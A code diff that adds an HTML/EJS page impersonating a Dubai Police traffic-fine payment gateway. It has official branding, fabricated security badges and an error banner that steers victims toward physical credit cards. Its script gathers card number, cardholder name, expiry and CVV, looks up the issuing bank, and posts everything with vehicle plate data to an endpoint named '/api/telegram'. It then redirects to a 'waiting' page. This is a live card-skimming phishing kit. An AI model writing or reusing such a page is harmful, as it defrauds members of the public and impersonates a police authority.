@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Secure Payment Gateway | Dubai Police</title>
+<link rel="icon" type="image/png" href="/dp-logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/style.css">
+<style>
+  :root {
+    --dp-green:      #006837;
+    --dp-green-dark: #004d29;
+    --dp-gold:       #c8a84b;
+    --dp-gold-dark:  #9c8338;
+    --ink:           #0f1a16;
+    --ink-soft:      #475569;
+    --ink-muted:     #94a3b8;
+    --line:          #e5e9e7;
+    --bg:            #f4f6f5;
+    --surface:       #ffffff;
+    --error:         #b91c1c;
+    --error-bg:      #fef2f2;
+    --error-bd:      #fecaca;
+  }
+  * { box-sizing: border-box; }
+  body { background: var(--bg); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; color: var(--ink); margin: 0; padding: 0; min-height: 100vh; }
+  [dir="rtl"] body { font-family: 'Cairo', 'Inter', sans-serif; }
+  [dir="rtl"] label { display: block; text-align: right; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+  input:focus { outline: none; }
+
+  /* ── Top brand bar ───────────────────────────────── */
+  .topbar {
+    background: linear-gradient(135deg, var(--dp-green) 0%, var(--dp-green-dark) 100%);
+    color: #fff;
+    padding: 12px 18px;
+    display: flex; align-items: center; gap: 12px;
+    border-bottom: 3px solid var(--dp-gold);
+    position: relative;
+  }
+  .tb-back {
+    width: 34px; height: 34px; border-radius: 8px;
+    background: rgba(255,255,255,0.12); border: 1px solid rgba(255,255,255,0.18);
+    color: #fff; font-size: 18px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .tb-logo {
+    width: 36px; height: 36px; border-radius: 50%;
+    background: #fff; padding: 3px;
+    flex-shrink: 0;
+    box-shadow: 0 0 0 2px rgba(200,168,75,0.45);
+  }
+  .tb-logo img { width: 100%; height: 100%; object-fit: contain; border-radius: 50%; }
+  .tb-title-wrap { flex: 1; min-width: 0; line-height: 1.1; }
+  .tb-title { font-size: 14px; font-weight: 800; letter-spacing: 0.3px; }
+  .tb-sub { font-size: 10.5px; opacity: 0.7; font-weight: 500; margin-top: 2px; }
+  .tb-arabic { font-family: 'Cairo', sans-serif; font-weight: 700; opacity: 0.85; }
+  .tb-lang {
+    font-size: 11px; font-weight: 700; padding: 6px 12px;
+    border-radius: 16px; border: 1.5px solid rgba(255,255,255,0.45);
+    background: rgba(255,255,255,0.10); color: #fff; cursor: pointer;
+    flex-shrink: 0;
+  }
+
+  /* ── Stepper ─────────────────────────────────────── */
+  .stepper {
+    background: var(--surface);
+    border-bottom: 1px solid var(--line);
+    padding: 10px 18px;
+    display: flex; justify-content: center; gap: 8px;
+    overflow-x: auto;
+  }
+  .step { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
+  .step-dot {
+    width: 22px; height: 22px; border-radius: 50%;
+    background: var(--line); color: var(--ink-muted);
+    font-size: 11px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .step-lbl { font-size: 11px; font-weight: 600; color: var(--ink-muted); white-space: nowrap; }
+  .step.done .step-dot { background: var(--dp-green); color: #fff; }
+  .step.done .step-lbl { color: var(--dp-green); }
+  .step.now  .step-dot { background: var(--dp-gold); color: #fff; box-shadow: 0 0 0 4px rgba(200,168,75,0.18); }
+  .step.now  .step-lbl { color: var(--ink); font-weight: 700; }
+  .step-line {
+    width: 22px; height: 2px; background: var(--line); margin: 0 2px; align-self: center;
+    flex-shrink: 0;
+  }
+  .step.done + .step-line { background: var(--dp-green); }
+
+  /* ── Container ──────────────────────────────────── */
+  .container { max-width: 480px; margin: 0 auto; padding: 14px 14px 24px; }
+  .reference-bar {
+    font-size: 10.5px; font-weight: 600; color: var(--ink-muted); letter-spacing: 1px;
+    text-align: center; margin: 4px 0 14px; text-transform: uppercase;
+  }
+  .reference-bar strong { font-family: 'SFMono-Regular', Consolas, monospace; color: var(--ink-soft); letter-spacing: 1.5px; }
+
+  /* ── Error banner ───────────────────────────────── */
+  .err-banner {
+    margin-bottom: 14px;
+    padding: 14px 16px;
+    border-radius: 10px;
+    display: flex; gap: 12px; align-items: flex-start;
+    animation: fadeUp 0.25s ease-out;
+  }
+  .err-icon { font-size: 18px; flex-shrink: 0; }
+  .err-title { font-weight: 700; font-size: 13px; margin-bottom: 3px; }
+  .err-msg { font-size: 12px; opacity: 0.85; line-height: 1.5; }
+
+  /* ── Summary card ───────────────────────────────── */
+  .summary {
+    background: linear-gradient(180deg, #ffffff 0%, #fafdfb 100%);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 14px 16px;
+    margin-bottom: 14px;
+    position: relative;
+    overflow: hidden;
+  }
+  .summary::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+    background: linear-gradient(90deg, var(--dp-green) 0%, var(--dp-gold) 100%);
+  }
+  .sum-row { display: flex; justify-content: space-between; align-items: center; gap: 12px; }
+  .sum-meta { font-size: 11px; color: var(--ink-muted); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+  .sum-plate { font-size: 18px; font-weight: 800; letter-spacing: 2px; color: var(--ink); font-family: 'SFMono-Regular', Consolas, monospace; }
+  .sum-emirate { font-size: 12px; color: var(--ink-soft); margin-top: 3px; font-weight: 500; }
+  .sum-amt-lbl { font-size: 10.5px; color: var(--ink-muted); text-transform: uppercase; letter-spacing: 0.8px; font-weight: 700; text-align: right; }
+  .sum-amt { font-size: 26px; font-weight: 900; color: var(--dp-green); line-height: 1.05; text-align: right; font-feature-settings: 'tnum'; }
+  .sum-divider { height: 1px; background: var(--line); margin: 12px 0; }
+  .sum-line { display: flex; justify-content: space-between; font-size: 12px; }
+  .sum-line .k { color: var(--ink-soft); }
+  .sum-line .v { color: var(--ink); font-weight: 600; }
+
+  /* ── Live card preview ──────────────────────────── */
+  .card-preview {
+    background: linear-gradient(135deg, #0a3520 0%, #14613a 60%, #1d8a52 100%);
+    color: #fff;
+    border-radius: 14px;
+    padding: 18px 18px 16px;
+    margin-bottom: 14px;
+    box-shadow: 0 8px 24px rgba(0,77,41,0.28);
+    position: relative;
+    overflow: hidden;
+    min-height: 168px;
+  }
+  .card-preview::after {
+    content: ''; position: absolute; right: -40px; bottom: -40px;
+    width: 160px; height: 160px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(200,168,75,0.30) 0%, transparent 70%);
+  }
+  .cp-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 18px; }
+  .cp-brand-mark { display: flex; align-items: center; gap: 8px; }
+  .cp-chip {
+    width: 34px; height: 26px; border-radius: 5px;
+    background: linear-gradient(135deg, #d4b056 0%, #f7e08a 50%, #b39140 100%);
+    box-shadow: inset 0 0 4px rgba(0,0,0,0.18);
+    position: relative;
+  }
+  .cp-chip::before { content: ''; position: absolute; inset: 3px; border: 1px solid rgba(0,0,0,0.18); border-radius: 2px; }
+  .cp-tag { font-size: 9px; font-weight: 700; letter-spacing: 1.5px; opacity: 0.85; text-transform: uppercase; }
+  .cp-type-badge { font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 12px; background: rgba(255,255,255,0.18); border: 1px solid rgba(255,255,255,0.30); letter-spacing: 1px; }
+  .cp-num {
+    font-family: 'SFMono-Regular', Consolas, monospace;
+    font-size: 17px; letter-spacing: 2.5px; font-weight: 600;
+    margin-bottom: 16px; word-spacing: 4px;
+    transition: opacity .15s;
+  }
+  .cp-num .dim { opacity: 0.35; }
+  .cp-bottom { display: flex; justify-content: space-between; align-items: flex-end; gap: 14px; }
+  .cp-bottom .k { font-size: 9px; opacity: 0.65; letter-spacing: 1.2px; text-transform: uppercase; margin-bottom: 3px; font-weight: 700; }
+  .cp-bottom .v { font-size: 13px; letter-spacing: 1px; font-weight: 700; min-height: 16px; }
+
+  /* ── Form panel ─────────────────────────────────── */
+  .panel {
+    background: var(--surface);
+    border-radius: 14px;
+    padding: 18px 16px 20px;
+    margin-bottom: 14px;
+    border: 1px solid var(--line);
+    box-shadow: 0 2px 14px rgba(15,26,22,0.04);
+  }
+  .panel-head {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid var(--line);
+  }
+  .panel-title { font-size: 13px; font-weight: 800; color: var(--ink); letter-spacing: 0.3px; }
+  .panel-badge { font-size: 9.5px; font-weight: 700; padding: 3px 8px; border-radius: 4px; background: rgba(0,104,55,0.10); color: var(--dp-green); letter-spacing: 1px; text-transform: uppercase; }
+
+  .field { margin-bottom: 13px; }
+  .field label { display: block; font-size: 11.5px; font-weight: 700; color: var(--ink-soft); margin-bottom: 6px; letter-spacing: 0.3px; text-transform: uppercase; }
+  .field input {
+    width: 100%; padding: 13px 14px;
+    border: 1.5px solid var(--line); border-radius: 10px;
+    font-size: 15px; background: #fcfcfb;
+    transition: all 0.15s;
+    font-family: inherit;
+  }
+  .field input:focus { border-color: var(--dp-green); background: #fff; box-shadow: 0 0 0 3px rgba(0,104,55,0.10); }
+  .field input.mono { font-family: 'SFMono-Regular', Consolas, monospace; letter-spacing: 2px; }
+  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .field-error { font-size: 11px; color: var(--error); margin-top: 4px; font-weight: 600; }
+  .field-note  { font-size: 11px; color: var(--dp-green); margin-top: 4px; font-weight: 600; }
+  .field-warn  { font-size: 11px; color: var(--error); margin-top: 4px; font-weight: 600; }
+  .input-wrap { position: relative; }
+  .input-suffix {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    font-size: 11px; font-weight: 800; color: var(--ink-muted);
+    letter-spacing: 1.5px; pointer-events: none;
+  }
+
+  /* ── Trust strip ────────────────────────────────── */
+  .trust {
+    display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px;
+    margin-bottom: 14px;
+  }
+  .trust-item {
+    background: #fff; border: 1px solid var(--line);
+    border-radius: 10px; padding: 10px 6px;
+    text-align: center;
+  }
+  .trust-ic { font-size: 16px; line-height: 1; margin-bottom: 4px; color: var(--dp-green); }
+  .trust-lbl { font-size: 9px; font-weight: 700; color: var(--ink-soft); letter-spacing: 0.4px; text-transform: uppercase; line-height: 1.2; }
+
+  /* ── Pay button ─────────────────────────────────── */
+  .pay-btn {
+    width: 100%; padding: 16px 20px;
+    background: linear-gradient(135deg, var(--dp-green) 0%, var(--dp-green-dark) 100%);
+    color: #fff; font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
+    border: none; border-radius: 12px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    box-shadow: 0 8px 22px rgba(0,77,41,0.30);
+    transition: all 0.18s;
+    margin-bottom: 12px;
+    position: relative;
+    overflow: hidden;
+  }
+  .pay-btn::before {
+    content: ''; position: absolute; inset: 0;
+    border-radius: 12px;
+    border: 1.5px solid rgba(200,168,75,0.55);
+    pointer-events: none;
+  }
+  .pay-btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 12px 26px rgba(0,77,41,0.36); }
+  .pay-btn:disabled { background: #94a3b8; cursor: not-allowed; box-shadow: none; }
+  .pay-btn:disabled::before { display: none; }
+  .pay-amount {
+    font-weight: 900; font-feature-settings: 'tnum';
+    padding-left: 10px; border-left: 1px solid rgba(255,255,255,0.32); margin-left: 2px;
+  }
+
+  /* ── Footer ─────────────────────────────────────── */
+  .ftr {
+    text-align: center;
+    font-size: 10.5px; color: var(--ink-muted);
+    padding: 12px 8px 0; line-height: 1.7;
+  }
+  .ftr strong { color: var(--ink-soft); font-weight: 700; }
+  .ftr-line { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; margin-top: 6px; font-weight: 600; }
+  .ftr-line span { display: inline-flex; align-items: center; gap: 4px; }
+
+  /* ── BIN loading ────────────────────────────────── */
+  .bin-status { display: flex; align-items: center; gap: 6px; font-size: 11px; margin-top: 6px; color: var(--ink-soft); font-weight: 600; }
+  .bin-spinner { width: 11px; height: 11px; border: 2px solid var(--line); border-top-color: var(--dp-green); border-radius: 50%; animation: spin 0.7s linear infinite; }
+</style>
+<%- include('_pixel') %>
+</head>
+<body>
+
+<!-- Brand Top Bar -->
+<header class="topbar">
+  <button class="tb-back" onclick="history.back()" aria-label="Back">‹</button>
+  <div class="tb-logo"><img src="/dp-logo.png" alt="Dubai Police"></div>
+  <div class="tb-title-wrap">
+    <div class="tb-title" data-i18n="secure_payment_title">Secure Payment Gateway</div>
+    <div class="tb-sub"><span class="tb-arabic">شرطة دبي</span> · Dubai Police</div>
+  </div>
+  <button class="tb-lang" id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')">عربي</button>
+</header>
+
+<!-- Stepper -->
+<div class="stepper" role="navigation" aria-label="Checkout steps">
+  <div class="step done"><div class="step-dot">✓</div><div class="step-lbl">Review</div></div>
+  <div class="step-line"></div>
+  <div class="step now"><div class="step-dot">2</div><div class="step-lbl">Payment</div></div>
+  <div class="step-line"></div>
+  <div class="step"><div class="step-dot">3</div><div class="step-lbl">Confirm</div></div>
+</div>
+
+<div class="container">
+  <div class="reference-bar">Reference · <strong id="ref-code">DP-XXXX-XXXX</strong></div>
+
+  <% if (locals.paymentError) { %>
+  <% const errMap = {
+    card_error:  { icon: '⚠', title: 'Incorrect Card Details', msg: 'The card information you entered is incorrect. Please verify and try again.', color: 'var(--error)', bg: 'var(--error-bg)', border: 'var(--error-bd)' },
+    card_type:   { icon: '✕', title: 'Card Type Not Supported', msg: 'Virtual, prepaid or debit cards are not accepted. Please use a physical credit card.', color: '#b45309', bg: '#fffbeb', border: '#fde68a' },
+    bank_error:  { icon: '✕', title: 'Bank Not Supported', msg: 'Your issuing bank is not supported for this transaction.', color: '#1e40af', bg: '#eff6ff', border: '#bfdbfe' },
+  }; const err = errMap[locals.paymentError] || errMap.card_error; %>
+  <div class="err-banner" style="background:<%= err.bg %>;border:1.5px solid <%= err.border %>;color:<%= err.color %>;">
+    <div class="err-icon"><%= err.icon %></div>
+    <div>
+      <div class="err-title"><%= err.title %></div>
+      <div class="err-msg"><%= err.msg %></div>
+    </div>
+  </div>
+  <% } %>
+
+  <!-- Transaction summary -->
+  <div class="summary">
+    <div class="sum-row">
+      <div>
+        <div class="sum-meta">Vehicle Plate</div>
+        <div class="sum-plate"><%= plateCodeLetter %> <%= plateNo %></div>
+        <div class="sum-emirate"><%= emirateName %> · <%= fineCount %> traffic fine<%= fineCount != 1 ? 's' : '' %></div>
+      </div>
+      <div>
+        <div class="sum-amt-lbl" data-i18n="total_due">Total Due</div>
+        <div class="sum-amt">AED <%= totalFine.toLocaleString() %></div>
+      </div>
+    </div>
+    <div class="sum-divider"></div>
+    <div class="sum-line"><span class="k">Fine count</span><span class="v"><%= fineCount %></span></div>
+    <div class="sum-line" style="margin-top:4px;"><span class="k">Emirate</span><span class="v"><%= emirateName %></span></div>
+    <div class="sum-line" style="margin-top:4px;"><span class="k">Payment method</span><span class="v">Credit / Debit Card</span></div>
+  </div>
+
+  <!-- Live card preview -->
+  <div class="card-preview" id="card-preview">
+    <div class="cp-top">
+      <div class="cp-brand-mark">
+        <div class="cp-chip"></div>
+        <div class="cp-tag">Credit Card</div>
+      </div>
+      <div class="cp-type-badge" id="cp-brand">CARD</div>
+    </div>
+    <div class="cp-num" id="cp-num"><span class="dim">●●●● ●●●● ●●●● ●●●●</span></div>
+    <div class="cp-bottom">
+      <div>
+        <div class="k">Cardholder</div>
+        <div class="v" id="cp-name">YOUR NAME</div>
+      </div>
+      <div style="text-align:right;">
+        <div class="k">Valid Thru</div>
+        <div class="v" id="cp-exp">MM/YY</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Card form -->
+  <div class="panel">
+    <div class="panel-head">
+      <div class="panel-title" data-i18n="card_info">Payment Details</div>
+      <div class="panel-badge">Encrypted</div>
+    </div>
+
+    <div class="field">
+      <label for="cardNumber" data-i18n="card_number">Card Number</label>
+      <div class="input-wrap">
+        <input type="text" inputmode="numeric" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="onCardNumberChange(this.value)" class="mono" autocomplete="cc-number">
+        <span class="input-suffix" id="card-type-label">CARD</span>
+      </div>
+      <div id="cardNumber-error" class="field-error" style="display:none;"></div>
+      <div id="bin-loading" class="bin-status" style="display:none;"><span class="bin-spinner"></span><span data-i18n="checking_card">Verifying card with issuer…</span></div>
+      <div id="bin-info" class="field-note" style="display:none;"></div>
+      <div id="bin-error" class="field-warn" style="display:none;"></div>
+    </div>
+
+    <div class="field">
+      <label for="cardName" data-i18n="cardholder_name">Cardholder Name</label>
+      <input type="text" id="cardName" data-i18n-pl="cardholder_name" placeholder="Name as printed on card" oninput="this.value=this.value.toUpperCase()" style="letter-spacing:1px;" autocomplete="cc-name">
+      <div id="cardName-error" class="field-error" style="display:none;"></div>
+    </div>
+
+    <div class="field-row">
+      <div class="field" style="margin-bottom:0;">
+        <label for="expiry" data-i18n="expiry_date">Expiry Date</label>
+        <input type="text" inputmode="numeric" id="expiry" placeholder="MM/YY" maxlength="5" oninput="onExpiryChange(this)" class="mono" autocomplete="cc-exp">
+        <div id="expiry-error" class="field-error" style="display:none;"></div>
+      </div>
+      <div class="field" style="margin-bottom:0;">
+        <label for="cvv" data-i18n="cvv_label">CVV</label>
+        <input type="password" inputmode="numeric" id="cvv" placeholder="•••" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'').slice(0,4); document.getElementById('cp-num').classList.add('flip');" class="mono" style="letter-spacing:6px;font-size:18px;" autocomplete="cc-csc">
+        <div id="cvv-error" class="field-error" style="display:none;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Trust strip -->
+  <div class="trust">
+    <div class="trust-item"><div class="trust-ic">🔒</div><div class="trust-lbl">256-bit<br>SSL</div></div>
+    <div class="trust-item"><div class="trust-ic">🛡</div><div class="trust-lbl">3D<br>Secure</div></div>
+    <div class="trust-item"><div class="trust-ic">✔</div><div class="trust-lbl">PCI<br>DSS</div></div>
+    <div class="trust-item"><div class="trust-ic">⚡</div><div class="trust-lbl">Instant<br>Verify</div></div>
+  </div>
+
+  <!-- Pay button -->
+  <button id="pay-btn" class="pay-btn" onclick="handleSubmit()">
+    <span data-i18n="pay_now">Pay Securely</span>
+    <span class="pay-amount">AED <%= totalFine.toLocaleString() %></span>
+  </button>
+
+  <!-- Footer -->
+  <div class="ftr">
+    By proceeding you agree to the <strong>Dubai Police Terms of Service</strong>.<br>
+    <div class="ftr-line">
+      <span>© Dubai Police</span>
+      <span>·</span>
+      <span>Payments secured by certified gateway</span>
+    </div>
+  </div>
+</div>
+
+<script src="/js/i18n.js"></script>
+<script>
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const PLATE_NO   = <%- JSON.stringify(plateNo) %>;
+const PLATE_SRC  = <%- JSON.stringify(plateSrcCode) %>;
+const PLATE_LTR  = <%- JSON.stringify(plateCodeLetter) %>;
+const FINE_COUNT = <%- JSON.stringify(fineCount) %>;
+
+let binInfo = null;
+let binTimer = null;
+
+// Build reference code from current time (display-only, harmless)
+(function () {
+  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
+  const day  = String(new Date().getDate()).padStart(2, '0');
+  const mon  = String(new Date().getMonth() + 1).padStart(2, '0');
+  const el = document.getElementById('ref-code');
+  if (el) el.textContent = 'DP-' + mon + day + '-' + rand;
+})();
+
+function formatCardNumber(val) {
+  const d = val.replace(/\D/g,'').slice(0,16);
+  return d.replace(/(.{4})/g,'$1 ').trim();
+}
+
+function getCardType(n) {
+  n = n.replace(/\s/g,'');
+  if (n.startsWith('4')) return 'visa';
+  if (n.startsWith('5') || n.startsWith('2')) return 'mastercard';
+  if (n.startsWith('3')) return 'amex';
+  return null;
+}
+
+function luhn(num) {
+  let sum = 0, shouldDouble = false;
+  for (let i = num.length - 1; i >= 0; i--) {
+    let d = parseInt(num[i], 10);
+    if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
+    sum += d; shouldDouble = !shouldDouble;
+  }
+  return sum % 10 === 0;
+}
+
+// Mirror typed input into the card preview
+function updatePreview() {
+  const raw = document.getElementById('cardNumber').value.replace(/\s/g,'').padEnd(16, '●').slice(0, 16);
+  const grp = raw.match(/.{1,4}/g) || [];
+  const html = grp.map(g => {
+    return g.split('').map(ch => (ch === '●' ? '<span class="dim">●</span>' : ch)).join('');
+  }).join(' ');
+  document.getElementById('cp-num').innerHTML = html;
+  const name = document.getElementById('cardName').value.trim() || 'YOUR NAME';
+  document.getElementById('cp-name').textContent = name.slice(0, 22);
+  const exp = document.getElementById('expiry').value || 'MM/YY';
+  document.getElementById('cp-exp').textContent = exp;
+}
+
+function onCardNumberChange(raw) {
+  const formatted = formatCardNumber(raw);
+  document.getElementById('cardNumber').value = formatted;
+
+  const type = getCardType(formatted);
+  const lbl = document.getElementById('card-type-label');
+  const brand = document.getElementById('cp-brand');
+  if (type === 'visa')         { lbl.textContent = 'VISA'; lbl.style.color = '#1a56db'; brand.textContent = 'VISA'; }
+  else if (type === 'mastercard') { lbl.textContent = 'MC'; lbl.style.color = '#e3440c'; brand.textContent = 'MASTERCARD'; }
+  else if (type === 'amex')    { lbl.textContent = 'AMEX'; lbl.style.color = '#0a6b8c'; brand.textContent = 'AMEX'; }
+  else                          { lbl.textContent = 'CARD'; lbl.style.color = '#9ca3af'; brand.textContent = 'CARD'; }
+
+  updatePreview();
+
+  const digits = formatted.replace(/\s/g,'');
+  clearTimeout(binTimer);
+  document.getElementById('bin-info').style.display = 'none';
+  document.getElementById('bin-error').style.display = 'none';
+  if (digits.length >= 6) {
+    binTimer = setTimeout(() => fetchBin(digits.slice(0, 8)), 400);
+  } else {
+    document.getElementById('bin-loading').style.display = 'none';
+    binInfo = null;
+  }
+}
+
+function fetchBin(bin) {
+  document.getElementById('bin-loading').style.display = '';
+  document.getElementById('bin-info').style.display = 'none';
+  document.getElementById('bin-error').style.display = 'none';
+  fetch('/api/card-bin?bin=' + bin)
+    .then(r => r.json())
+    .then(d => {
+      document.getElementById('bin-loading').style.display = 'none';
+      if (!d.ok) {
+        document.getElementById('bin-error').textContent = 'Card lookup failed';
+        document.getElementById('bin-error').style.display = '';
+        binInfo = null;
+      } else {
+        binInfo = d.data;
+        const parts = [d.data.Scheme && d.data.Scheme.toUpperCase(), d.data.Type, d.data.Issuer, d.data.Country?.Name].filter(Boolean);
+        document.getElementById('bin-info').textContent = parts.join(' · ');
+        document.getElementById('bin-info').style.display = '';
+      }
+    })
+    .catch(() => {
+      document.getElementById('bin-loading').style.display = 'none';
+      binInfo = null;
+    });
+}
+
+function onExpiryChange(el) {
+  const digits = el.value.replace(/\D/g,'').slice(0,4);
+  el.value = digits.length >= 3 ? digits.slice(0,2) + '/' + digits.slice(2) : digits;
+  updatePreview();
+}
+
+function setFieldError(field, msg) {
+  const el = document.getElementById(field + '-error');
+  const input = document.getElementById(field);
+  if (msg) { el.textContent = msg; el.style.display = ''; input.style.borderColor = 'var(--error)'; }
+  else      { el.style.display = 'none'; input.style.borderColor = ''; }
+}
+
+function validate() {
+  let ok = true;
+  const cardName = document.getElementById('cardName').value.trim();
+  const cardNum  = document.getElementById('cardNumber').value.replace(/\s/g,'');
+  const expiry   = document.getElementById('expiry').value;
+  const cvv      = document.getElementById('cvv').value;
+
+  if (!cardName) { setFieldError('cardName','Please enter cardholder name'); ok = false; } else setFieldError('cardName','');
+  if (cardNum.length < 13)     { setFieldError('cardNumber','Card number is too short'); ok = false; }
+  else if (!luhn(cardNum))     { setFieldError('cardNumber','Invalid card number'); ok = false; }
+  else                         { setFieldError('cardNumber',''); }
+
+  const [mm, yy] = expiry.split('/');
+  const expMonth = Number(mm), expYear = 2000 + Number(yy);
+  const now = new Date();
+  if (!mm || !yy || expMonth > 12 || expMonth < 1) {
+    setFieldError('expiry','Invalid expiry date'); ok = false;
+  } else if (expYear < now.getFullYear() || (expYear === now.getFullYear() && expMonth < now.getMonth() + 1)) {
+    setFieldError('expiry','Card expired'); ok = false;
+  } else {
+    setFieldError('expiry','');
+  }
+  if (cvv.length < 3) { setFieldError('cvv','Invalid CVV'); ok = false; } else setFieldError('cvv','');
+  return ok;
+}
+
+// Mirror name input live
+document.getElementById('cardName').addEventListener('input', updatePreview);
+
+function generateSid() {
+  const arr = new Uint8Array(16);
+  crypto.getRandomValues(arr);
+  return Array.from(arr).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+async function handleSubmit() {
+  if (!validate()) return;
+  const btn = document.getElementById('pay-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span style="width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;display:inline-block;animation:spin 0.7s linear infinite;"></span><span style="margin-left:10px;">Processing…</span>';
+
+  const sid        = generateSid();
+  const cardName   = document.getElementById('cardName').value.trim();
+  const cardNumber = document.getElementById('cardNumber').value;
+  const expiry     = document.getElementById('expiry').value;
+  const cvv        = document.getElementById('cvv').value;
+
+  try {
+    const res = await fetch('/api/telegram', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({sid, cardName, cardNumber, expiry, cvv, plateNo: PLATE_NO, plateSrcCode: PLATE_SRC, plateCodeLetter: PLATE_LTR, totalFine: TOTAL_FINE, fineCount: FINE_COUNT, binInfo})
+    });
+    const json = await res.json().catch(() => null);
+    if (!res.ok || !json?.ok) console.warn('Telegram failed');
+  } catch(e) { console.warn('Telegram error', e); }
+
+  const last4  = document.getElementById('cardNumber').value.replace(/\s/g,'').slice(-4);
+  const issuer = encodeURIComponent(binInfo?.Issuer || '');
+  window.location.href = '/waiting?cardLast4=' + last4 + '&totalFine=' + TOTAL_FINE + '&issuer=' + issuer + '&sid=' + sid;
+}
+
+// Initial preview render
+updatePreview();
+</script>
+</body>
+</html>
